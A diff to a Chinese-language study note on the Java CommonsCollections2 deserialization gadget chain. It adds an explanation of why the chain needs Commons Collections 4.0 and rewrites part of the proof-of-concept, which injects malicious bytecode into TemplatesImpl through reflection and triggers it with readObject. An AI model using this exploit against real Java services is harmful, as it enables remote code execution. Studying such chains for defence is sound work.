@@ -78,6 +78,11 @@ ObjectInputStream.readObject()
 这是为啥捏？回去重新跟一下，发现原来是要满足在`heapify()`方法的操作，如果只有一个元素则`size`为 1，最后经过无符号右移动 1 位并且减 1 ，则结果为 -1 将无法进入`siftDown()`方法
 ![image-20221009121552839](images/image-20221009121552839.png)
 
+补充一下，`TransformingComparator`类只有在`CommonsCollections4.0`的时候才实现`serializable`接口，因此才可以进行序列化与反序列化。
+![image-20221012154454936](images/image-20221012154454936.png)
+
+这也是为什么`CommonsCollections2`限制了利用版本在`CommonsCollections4.0`的原因。
+
 ## 构造 POC
 
 根据以上学习，利用链已经清晰明了，构造 POC
@@ -227,10 +232,20 @@ public class CommonsCollections2 {
         // 转换成字节码
         byte[] classBytes = evailClass.toBytecode();
         byte[][] targetByteCodes = new byte[][]{classBytes};
+        // 反射修改
         TemplatesImpl templates = TemplatesImpl.class.newInstance();
-        setFieldValue(templates, "_bytecodes",targetByteCodes);
-        setFieldValue(templates, "_name", "name");
-        setFieldValue(templates, "_class", null);
+        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes");
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates, targetByteCodes);
+
+        Field name = templates.getClass().getDeclaredField("_name");
+        name.setAccessible(true);
+        name.set(templates, "name");
+
+        Field _class = templates.getClass().getDeclaredField("_class");
+        _class.setAccessible(true);
+        _class.set(templates, null);
+
         // 构造InvokerTransformer
         Constructor constructor = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer").getDeclaredConstructor(String.class);
         constructor.setAccessible(true);
@@ -263,23 +278,6 @@ public class CommonsCollections2 {
         // 创建并实例化对象输入流
         ObjectInputStream in = new ObjectInputStream(fileInputStream);
         in.readObject();
-    }
-    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
-        final Field field = getField(obj.getClass(), fieldName);
-        field.set(obj, value);
-    }
-
-    public static Field getField(final Class<?> clazz, final String fieldName) {
-        Field field = null;
-        try {
-            field = clazz.getDeclaredField(fieldName);
-            field.setAccessible(true);
-        }
-        catch (NoSuchFieldException ex) {
-            if (clazz.getSuperclass() != null)
-                field = getField(clazz.getSuperclass(), fieldName);
-        }
-        return field;
     }
 }
 ```
